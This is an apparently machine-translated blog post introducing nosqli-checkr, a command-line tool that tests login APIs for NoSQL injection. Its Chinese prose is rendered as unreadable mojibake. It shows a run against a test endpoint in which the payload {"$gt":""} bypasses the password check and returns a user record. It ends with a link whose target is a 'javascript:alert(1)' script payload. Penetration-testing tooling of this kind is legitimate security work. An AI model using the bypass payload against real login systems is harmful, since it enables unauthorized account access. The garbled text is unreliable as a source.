# ä½¿ NoSQLi pentest æ›´ç®€å•

> åŸæ–‡:[https://dev . to/null dreams/making-easy-a-no sqli-pentest-d23](https://dev.to/nulldreams/making-easier-a-nosqli-pentest-d23)

å¤§å®¶å¥½ï¼

ä»Šå¤©ï¼Œæˆ‘å·²ç»åˆ›å»ºäº†ä¸€ä¸ªé¡¹ç›®ï¼Œå®ƒè‡ªåŠ¨åŒ–äº† NoSQLi pentestï¼Œä½†è¿™æ˜¯ç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼Œæˆ‘åœ¨è¿™ä¸ªé¡¹ç›®ä¸­å¯»æ±‚å¸®åŠ©ã€‚

å¦‚æœä½ æœ‰å…´è¶£å¸®åŠ©ä¸€ä¸ªå°é¡¹ç›®æˆä¸ºä¸€ä¸ªå¤§é¡¹ç›®ï¼Œä½¿æˆ‘ä»¬ä½œä¸ºâ€œå®‰å…¨å®¶ä¼™â€çš„ç”Ÿæ´»æ›´å®¹æ˜“ï¼Œè¯·å‘é€é—®é¢˜æˆ–å‘é€ PRã€‚

é‚£ä¹ˆï¼Œè¿™ä¸ªé¡¹ç›®æ˜¯å¦‚ä½•è¿ä½œçš„å‘¢ï¼Ÿ

åˆ©ç”¨æ¥è‡ªè¯·æ±‚çš„ä¸€äº›ä¿¡æ¯,â€œexploitâ€å¯ä»¥æµ‹è¯•è¯·æ±‚å‚æ•°æ˜¯å¦å¯ä»¥è¢« NoSQLi çš„ä¸€äº›æœ‰æ•ˆè´Ÿè½½åˆ©ç”¨ã€‚

åˆ©ç”¨ä¸€ä¸ªç™»å½• API çš„ä¾‹å­ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ª POST è¯·æ±‚ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ª JSON æ•°æ®ï¼Œå¸¦æœ‰`user`å’Œ`pass` :

```
[igor.martins automated]$ nosqli-checkr scan --host="https://nosql-checkr-test.herokuapp.com/api/v1/login" --data='{ "user": "wubba", "pass": "" }' --method="post" --params="pass" --error-message='{"success":false,"result":"user/pass not found"}'

 â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—      â–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  
 â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘      â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•— 
 â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘      â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• 
 â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘ â•šâ•â•â•â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘â–„â–„ â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•‘      â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘      â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â•â•   â–ˆâ–ˆâ•‘      â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•— 
 â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘     â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘ 
 â•šâ•â•  â•šâ•â•â•â•  â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•â•  â•šâ•â•â–€â–€â•â•  â•šâ•â•â•â•â•â•â• â•šâ•â•      â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â• â•šâ•â•  â•šâ•â• 

âœ” Request finished
âœ” Response analyzed
âœ” https://nosql-checkr-test.herokuapp.com/api/v1/login is vulnerable

â„¹ Payload: {"$gt":""}
â„¹ Evil data ğŸ˜ˆ: {"user":"wubba","pass":{"$gt":""}}
â„¹ Data stoled:
{
    "success": true,
    "result": {
        "user": "wubba",
        "_id": "hVFQzFwVlMwCYFBT"
    }
} 
```

â€œåˆ©ç”¨â€æµ‹è¯•å‚æ•°`pass`å¹¶æ‰¾åˆ°å¯ä»¥åˆ©ç”¨ NoSQL æ³¨å…¥ç¼ºé™·çš„æœ‰æ•ˆè½½è·`{"$gt":""}`ã€‚

### [](#parameters)å‚æ•°

*   `-h or --host`:è·¯ç”± URLã€‚ä¾‹:[https://nosql-checkr-test.herokuapp.com/api/v1/login](https://nosql-checkr-test.herokuapp.com/api/v1/login)
*   `-hr or --headers`:è¯·æ±‚å¤´ã€‚Ex: token:val æˆ– token:valï¼›ä»¤ç‰Œ 2:val2
*   `-d or --data`:è¯·æ±‚æ•°æ®:Ex: { "user": "wubba "ï¼Œ" pass ":" }
*   `-m or --method`:è¯·æ±‚æ–¹å¼:ä¾‹å¦‚:post æˆ– POST
*   `-p or --params`:å°†è¢«åˆ©ç”¨çš„è¯·æ±‚å‚æ•°:ä¾‹å¦‚:pass æˆ– userï¼Œpass
*   `-e or --error-message`:è¯·æ±‚çš„é»˜è®¤é”™è¯¯ä¿¡æ¯ã€‚ä¾‹å¦‚:{"success":falseï¼Œ" result ":"æ‰¾ä¸åˆ°ç”¨æˆ·/é€šè¡Œè¯" }

[Github é¡¹ç›®](https://github.com/nulldreams/nosqli-checkr)

[Github é¡¹ç›®](https://dev.tojavascript:alert(1))